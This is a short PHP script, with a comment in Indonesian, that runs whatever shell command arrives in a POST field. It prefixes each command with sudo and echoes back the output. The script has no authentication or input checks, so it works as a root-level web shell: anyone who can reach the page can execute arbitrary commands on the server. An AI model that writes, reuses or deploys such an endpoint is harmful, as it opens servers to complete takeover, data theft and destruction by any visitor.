<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['command'])) {
    $command = 'sudo ' . $_POST['command']; // Tambahkan 'sudo' di sini
    $output = shell_exec($command);
    echo $output;
} else {
    echo "Invalid request";
}
?>
